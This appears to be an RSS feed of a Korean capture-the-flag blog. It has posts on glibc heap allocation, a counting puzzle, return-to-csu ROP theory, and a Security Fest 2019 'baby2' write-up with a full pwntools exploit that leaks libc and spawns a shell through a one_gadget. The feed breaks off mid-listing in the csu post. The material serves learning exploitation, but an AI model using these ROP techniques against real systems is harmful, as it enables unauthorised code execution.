<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>j0n9hyun</title>
    <link>http://j0n9hyun.github.io/</link>
    <atom:link href="/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>j0n9yhun&#39;s repository</description>
    <pubDate>Fri, 24 May 2019 12:55:30 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>[Heap Thoery] First Fit</title>
      <link>http://j0n9hyun.github.io/2019/05/24/Heap-Theory-First-Fit/</link>
      <guid>http://j0n9hyun.github.io/2019/05/24/Heap-Theory-First-Fit/</guid>
      <pubDate>Fri, 24 May 2019 05:51:30 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h2 id=&quot;first-fit&quot;&gt;&lt;a class=&quot;markdownIt-A
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h2 id="first-fit"><a class="markdownIt-Anchor" href="#first-fit"></a> First Fit</h2><p>Heap 문제를 공략하기 위해서는 기본적인 할당 흐름을 이해할 수 있어야 한다.<br>그래서 이번 글에서는 블로그 활성화도 하고 복습도 할 겸 겸사겸사 끄적여보기로했다.</p><p>다음의 예제를 한번 살펴보자.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> *a = <span class="built_in">malloc</span>(<span class="number">300</span>);</span><br><span class="line"><span class="keyword">char</span> *b = <span class="built_in">malloc</span>(<span class="number">250</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"malloc(300) A : %p\n"</span>, a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"malloc(250) B : %p\n"</span>, b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"-------free malloc A-------"</span>);</span><br><span class="line"></span><br><span class="line">a = <span class="built_in">malloc</span>(<span class="number">250</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"malloc(250) A : %p\n"</span>, a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><center> [Example.c] </center><p><strong>3줄 요약</strong></p><ol><li><strong>a</strong>와 <strong>b</strong>에 각각 <code>malloc</code><sup id="fnref:1"><a href="#fn:1" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="동적할당">[1]</span></a></sup>을 요청한다.</li><li><strong>a</strong>를 <code>free</code><sup id="fnref:2"><a href="#fn:2" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="할당해제">[2]</span></a></sup>한다.</li><li><strong>a</strong>에 다시 <code>malloc</code><sup id="fnref:1"><a href="#fn:1" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="동적할당">[1]</span></a></sup>을 요청한다.</li></ol><p>a에 300, b에 250 바이트가 동적 할당 되었다. 둘은 서로 다른 크기를 가지고 있는데<br>a를 free 해준 뒤 다시 재할당을 해주면 어떻게 될까?<br><br></p><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58300514-cc678b00-7e1d-11e9-80cf-c2f50de11e8c.png"><center> [실행 결과] </center>서로 다른 크기로 할당했지만 결과는 이전과 동일한 주소를 가리키게 된다.<br>그렇다면 남은 50 바이트는 그대로 증발되느냐? 아니다. 남은 50바이트도 여전히 남아있다.대신 a 청크가 두 개로 분리된다(300바이트 작을 경우). a1, a2 이런 식으로 말이다.<center><table><thead><tr><th style="text-align:center">head</th></tr></thead><tbody><tr><td style="text-align:center">a1[250]</td></tr><tr><td style="text-align:center">a2[50]</td></tr><tr><td style="text-align:center"><strong>tail</strong></td></tr></tbody></table><h3 id="malloc250-재할당-후"><a class="markdownIt-Anchor" href="#malloc250-재할당-후"></a> ↓ malloc(250) 재할당 후</h3><table><thead><tr><th style="text-align:center">head</th></tr></thead><tbody><tr><td style="text-align:center">a2 (a1값 반환됨)</td></tr><tr><td style="text-align:center"><strong>tail</strong></td></tr></tbody></table></center><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> *a = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line"><span class="keyword">char</span> *b = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line"><span class="keyword">char</span> *c = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line"><span class="keyword">char</span> *d = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"malloc(100) A : %p\n"</span>, a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"malloc(100) B : %p\n"</span>, b);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"malloc(100) C : %p\n"</span>, c);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"malloc(100) D : %p\n"</span>, d);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"><span class="built_in">free</span>(c);</span><br><span class="line"><span class="built_in">free</span>(d);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"-------free malloc A-------"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"-------free malloc B-------"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"-------free malloc C-------"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"-------free malloc D-------"</span>);</span><br><span class="line"></span><br><span class="line">a = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">b = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">c = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">d = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"-------malloc(100) A-------"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"-------malloc(100) B-------"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"-------malloc(100) C-------"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"-------malloc(100) D-------"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"malloc(100) A : %p\n"</span>, a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"malloc(100) B : %p\n"</span>, b);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"malloc(100) C : %p\n"</span>, c);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"malloc(100) D : %p\n"</span>, d);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><center> <caption> [Example2.c] </caption> </center>다음은 fastbin 예제이다. fastbin은 단일 연결 리스트<sup id="fnref:3"><a href="#fn:3" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="Singly Linked list">[3]</span></a></sup>라서 메모리 할당 및 해제 속도가 빠르며 LIFO 구조를 지니고 있다.아래의 과정을 확인해보면 알 수 있다.<p><code>head - a - tail</code> <strong>free⒜</strong><br><code>head - b - a - tail</code><strong>free⒝</strong><br><code>head - c - b - a - tail</code> <strong>free⒞</strong><br><code>head - d - c - b - a - tail</code> <strong>free⒟</strong><br><code>head - c - b - a - tail</code> <strong>malloc⒜</strong><br><code>head - b - a - tail</code> <strong>malloc⒝</strong><br><code>head - a - tail</code> <strong>malloc⒞</strong><br><code>head - tail</code> <strong>malloc⒟</strong></p><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58298844-fd44c180-7e17-11e9-97cc-e8d39f0a619d.PNG"><center> [실행 결과] </center> <br><style>  img.border-shadow{          border:1px solid #888888;          box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);      }</style><div id="footnotes"><hr><div id="footnotelist"><ol style="list-style: none; padding-left: 0; margin-left: 40px"><li id="fn:1"><span style="display: inline-block; vertical-align: top; padding-right: 10px; margin-left: -40px">1.</span><span style="display: inline-block; vertical-align: top; margin-left: 10px;">동적할당<a href="#fnref:1" rev="footnote"> ↩</a></span></li><li id="fn:2"><span style="display: inline-block; vertical-align: top; padding-right: 10px; margin-left: -40px">2.</span><span style="display: inline-block; vertical-align: top; margin-left: 10px;">할당해제<a href="#fnref:2" rev="footnote"> ↩</a></span></li><li id="fn:3"><span style="display: inline-block; vertical-align: top; padding-right: 10px; margin-left: -40px">3.</span><span style="display: inline-block; vertical-align: top; margin-left: 10px;">Singly Linked list<a href="#fnref:3" rev="footnote"> ↩</a></span></li></ol></div></div>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/05/24/Heap-Theory-First-Fit/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Security Fest 2019 baby2</title>
      <link>http://j0n9hyun.github.io/2019/05/24/Security-Fest-2019-baby2/</link>
      <guid>http://j0n9hyun.github.io/2019/05/24/Security-Fest-2019-baby2/</guid>
      <pubDate>Fri, 24 May 2019 00:03:43 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h3 id=&quot;baby2&quot;&gt;&lt;a class=&quot;markdownIt-Ancho
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="baby2"><a class="markdownIt-Anchor" href="#baby2"></a> Baby2</h3><p><code>기본 ROP 문제</code></p><p>우분투 18.04 환경에서는  main으로 안 돌아가는 경우도 있는 것 같다. <sup id="fnref:1"><a href="#fn:1" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="내부 인스트럭션에서 조금 차이가 있는 듯하다. [참고](https://kong.re.kr/?p=335)">[1]</span></a></sup> <small> (일단 난 잘됨) </small></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process('./baby2')</span></span><br><span class="line">r = remote(<span class="string">'baby-01.pwn.beer'</span>, <span class="number">10002</span>)</span><br><span class="line">e = ELF(<span class="string">'./baby2'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> a: r.recvuntil(a)</span><br><span class="line">sl = <span class="keyword">lambda</span> a: r.sendline(a)</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b: r.sendlineafter(a, b)</span><br><span class="line">ex = <span class="keyword">lambda</span> : r.interactive()</span><br><span class="line"></span><br><span class="line">puts_offset = libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">puts_plt = e.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = e.got[<span class="string">'puts'</span>]</span><br><span class="line">main = e.symbols[<span class="string">'main'</span>]</span><br><span class="line">pr = <span class="number">0x0000000000400783</span> <span class="comment"># pop rdi; ret</span></span><br><span class="line">binsh_offset = libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">system_offset = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">one_gadget = <span class="number">0x4f2c5</span></span><br><span class="line"></span><br><span class="line">p = <span class="string">""</span></span><br><span class="line">p += <span class="string">"\x90"</span>*<span class="number">0x18</span></span><br><span class="line">p += p64(pr)</span><br><span class="line">p += p64(puts_got)</span><br><span class="line">p += p64(puts_plt)</span><br><span class="line">p += p64(main) </span><br><span class="line">sl(p)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">"input: "</span>)</span><br><span class="line">leaked = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(leaked)</span><br><span class="line">libc_base = leaked - puts_offset</span><br><span class="line">one_shot = libc_base + one_gadget</span><br><span class="line"></span><br><span class="line">p = <span class="string">""</span></span><br><span class="line">p += <span class="string">"\x90"</span>*<span class="number">0x18</span></span><br><span class="line">p += p64(one_shot)</span><br><span class="line">sla(<span class="string">'input: '</span>, p)</span><br><span class="line">ex()</span><br></pre></td></tr></table></figure><center><small>[Exploit Code]</small></center> <br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58294548-a46c2d80-7e05-11e9-8941-275e6762359b.PNG"><center><small>[Remote]</small></center> <br><style>  img.border-shadow{        border:1px solid #888888;        box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);    }</style><div id="footnotes"><hr><div id="footnotelist"><ol style="list-style: none; padding-left: 0; margin-left: 40px"><li id="fn:1"><span style="display: inline-block; vertical-align: top; padding-right: 10px; margin-left: -40px">1.</span><span style="display: inline-block; vertical-align: top; margin-left: 10px;">내부 인스트럭션에서 조금 차이가 있는 듯하다. <a href="https://kong.re.kr/?p=335" target="_blank" rel="noopener">참고</a><a href="#fnref:1" rev="footnote"> ↩</a></span></li></ol></div></div>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/05/24/Security-Fest-2019-baby2/#disqus_thread</comments>
    </item>
    
    <item>
      <title>ALLMN CTF 2019 Doesn&#39;t contain K integer</title>
      <link>http://j0n9hyun.github.io/2019/05/05/doesnt_contain_k_integer/</link>
      <guid>http://j0n9hyun.github.io/2019/05/05/doesnt_contain_k_integer/</guid>
      <pubDate>Sat, 04 May 2019 17:06:00 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h2 id=&quot;doesnt-contain-k-integer&quot;&gt;&lt;a clas
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h2 id="doesnt-contain-k-integer"><a class="markdownIt-Anchor" href="#doesnt-contain-k-integer"></a> Doesn’t contain K integer</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">How many numbers from 1 to N that don&apos;t contain K number. Input: N (integer number) and space K (integer number).  </span><br><span class="line">Output: The total number. Example if N is 30 and K is 3 there are 27 numbers that don&apos;t contain number 3.  </span><br><span class="line">So the flag will be ALLMN&#123;total number&#125;</span><br></pre></td></tr></table></figure><center><small>[문제 내용]</small></center><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">281939942</span></span><br><span class="line">k = <span class="number">3</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'3'</span> <span class="keyword">in</span> str(i):</span><br><span class="line">        n -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"total is "</span> + str(n)</span><br></pre></td></tr></table></figure><center><small>[Python]</small></center><p>파이썬으로 짜면 금방인 문제. 하지만 간단하면서도 간단하지 않다. 계산하는 수가 매우 높아서 소요 시간이 개노답이기 때문이다. 그래서 결국 c로 다시 뚝딱했다.<sup id="fnref:1"><a href="#fn:1" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="C와 Python의 연산 속도는 약 100배가량  차이가  난다.">[1]</span></a></sup> c로도 약 2시간 30분이 소요 됐다. (더 빠른 알고리즘이 있겠지만 아몰랑) <br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> num_start = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> num_end = <span class="number">281939942</span>;</span><br><span class="line"><span class="keyword">int</span> num = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> digit = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">digit %= <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (num = num_start; num &lt;= num_end; num++) &#123;</span><br><span class="line"><span class="keyword">int</span> temp_num = num;</span><br><span class="line"><span class="keyword">int</span> have = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (num == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (digit == <span class="number">0</span>) &#123;</span><br><span class="line">have = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">while</span> (temp_num &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (temp_num % <span class="number">10</span> == digit) &#123;</span><br><span class="line">have = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">temp_num /= <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (have == <span class="number">1</span>) &#123;</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">if</span> (count &gt; <span class="number">1</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">", "</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d "</span>, num);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n\ncount : %d\n"</span>, num_end-count+<span class="number">1</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><center><small>[C]</small></center><br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58037160-c3e62a80-7b67-11e9-9c1e-41ef1aac964a.png"><center><small>[Run]</small></center><style>  img.border-shadow{    border:1px solid #888888;    box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);}</style><div id="footnotes"><hr><div id="footnotelist"><ol style="list-style: none; padding-left: 0; margin-left: 40px"><li id="fn:1"><span style="display: inline-block; vertical-align: top; padding-right: 10px; margin-left: -40px">1.</span><span style="display: inline-block; vertical-align: top; margin-left: 10px;">C와 Python의 연산 속도는 약 100배가량  차이가  난다.<a href="#fnref:1" rev="footnote"> ↩</a></span></li></ol></div></div>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/05/05/doesnt_contain_k_integer/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Reutrn-to-Csu Theory</title>
      <link>http://j0n9hyun.github.io/2019/04/01/rtc_theory/</link>
      <guid>http://j0n9hyun.github.io/2019/04/01/rtc_theory/</guid>
      <pubDate>Mon, 01 Apr 2019 05:00:00 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h2 id=&quot;return-to-csu&quot;&gt;&lt;a class=&quot;markdown
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h2 id="return-to-csu"><a class="markdownIt-Anchor" href="#return-to-csu"></a> Return-to-csu</h2><p><a href="https://ctf.j0n9hyun.xyz/files/240f3f36125011483a357c5c8fb0fb4a/rtc" target="_blank" rel="noopener">Binary File</a></p><p>64bit ROP 기법을 사용할 때 우리는 gadget을 이용하곤 한다. 하지만 우리가 원하는 pop gadget이 존재하지 않을 경우는 어떻게 할까?<br>바로 RTC 를 사용하여 우회를 시킬 수 있다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-40h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Hey, ROP! What's Up?\n"</span>, <span class="number">0x15</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><center><small>[Problem]</small></center>확인하기 위해 본인 사이트에 올라가 있는 문제를 예시로 들겠다. 문제에는 일반적인 ROP처럼 write 함수와 read 함수가 주어져있다. <br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[INFO] File: rtc</span><br><span class="line"><span class="number">0x00000000004006bc</span>: pop r12; pop r13; pop r14; pop r15; ret; </span><br><span class="line"><span class="number">0x00000000004006be</span>: pop r13; pop r14; pop r15; ret; </span><br><span class="line"><span class="number">0x00000000004006c0</span>: pop r14; pop r15; ret; </span><br><span class="line"><span class="number">0x00000000004006c2</span>: pop r15; ret; </span><br><span class="line"><span class="number">0x000000000040054f</span>: pop rbp; mov edi, <span class="number">0x601048</span>; jmp rax; </span><br><span class="line"><span class="number">0x00000000004006bb</span>: pop rbp; pop r12; pop r13; pop r14; pop r15; ret; </span><br><span class="line"><span class="number">0x00000000004006bf</span>: pop rbp; pop r14; pop r15; ret; </span><br><span class="line"><span class="number">0x0000000000400560</span>: pop rbp; ret; </span><br><span class="line"><span class="number">0x00000000004006c3</span>: pop rdi; ret; </span><br><span class="line"><span class="number">0x00000000004006c1</span>: pop rsi; pop r15; ret; </span><br><span class="line"><span class="number">0x00000000004006bd</span>: pop rsp; pop r13; pop r14; pop r15; ret;</span><br></pre></td></tr></table></figure><center><small>[gadgets]</small></center>gadget 도구를 이용해서 확인해보면 rdi와 rsi를 채울 수 있을만한 gadget이 보이지 않는다. 그래도 괜찮다 우리에겐 csu가 있으니까!  _libc_csu_init 이라는 함수를 어셈블리 뷰로 확인해보자. <br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000400660</span> ; <span class="keyword">void</span> _libc_csu_init(<span class="keyword">void</span>)</span><br><span class="line">.text:<span class="number">0000000000400660</span> <span class="keyword">public</span> __libc_csu_init</span><br><span class="line">.text:<span class="number">0000000000400660</span> __libc_csu_init proc near</span><br><span class="line">.text:<span class="number">0000000000400660</span> ; __unwind &#123;</span><br><span class="line">.text:<span class="number">0000000000400660</span> push    r15</span><br><span class="line">.text:<span class="number">0000000000400662</span> push    r14</span><br><span class="line">.text:<span class="number">0000000000400664</span> mov     r15d, edi</span><br><span class="line">.text:<span class="number">0000000000400667</span> push    r13</span><br><span class="line">.text:<span class="number">0000000000400669</span> push    r12</span><br><span class="line">.text:<span class="number">000000000040066B</span> lea     r12, __frame_dummy_init_array_entry</span><br><span class="line">.text:<span class="number">0000000000400672</span> push    rbp</span><br><span class="line">.text:<span class="number">0000000000400673</span> lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class="line">.text:<span class="number">000000000040067</span>A push    rbx</span><br><span class="line">.text:<span class="number">000000000040067B</span> mov     r14, rsi</span><br><span class="line">.text:<span class="number">000000000040067</span>E mov     r13, rdx</span><br><span class="line">.text:<span class="number">0000000000400681</span> sub     rbp, r12</span><br><span class="line">.text:<span class="number">0000000000400684</span> sub     rsp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">0000000000400688</span> sar     rbp, <span class="number">3</span></span><br><span class="line">.text:<span class="number">000000000040068</span>C call    _init_proc</span><br><span class="line">.text:<span class="number">0000000000400691</span> test    rbp, rbp</span><br><span class="line">.text:<span class="number">0000000000400694</span> jz      <span class="keyword">short</span> loc_4006B6</span><br></pre></td></tr></table></figure><center><small>[libc_csu_init]</small></center><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 